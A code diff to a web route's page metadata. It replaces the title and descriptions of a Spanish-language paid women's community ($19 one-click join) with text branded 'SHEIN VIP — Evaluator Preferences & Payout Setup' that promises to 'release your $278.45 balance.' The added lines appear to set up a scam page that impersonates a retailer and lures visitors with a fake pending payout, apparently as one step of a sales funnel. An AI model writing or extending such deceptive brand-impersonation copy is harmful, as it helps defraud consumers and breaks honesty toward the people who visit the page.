@@ -10,17 +10,17 @@ export const Route = createFileRoute("/up2")({
   loader: () => ({ lang: resolveLang() }),
   head: () => ({
     meta: [
-      { title: "Comunidad VitaProtocol — Únete por $19" },
+      { title: "SHEIN VIP — Evaluator Preferences & Payout Setup" },
       {
         name: "description",
         content:
-          "Acceso exclusivo a la red social privada de mujeres VitaProtocol. Pago único de $19 con un solo clic.",
+          "Set your product category preferences and payout schedule to release your $278.45 balance.",
       },
-      { property: "og:title", content: "Comunidad VitaProtocol — Únete por $19" },
+      { property: "og:title", content: "SHEIN VIP — Evaluator Preferences & Payout Setup" },
       {
         property: "og:description",
         content:
-          "Únete a la red social privada de mujeres que están transformando su equilibrio hormonal.",
+          "Set your product category preferences and payout schedule to release your $278.45 balance.",
       },
       { property: "og:type", content: "website" },
       { name: "twitter:card", content: "summary_large_image" },
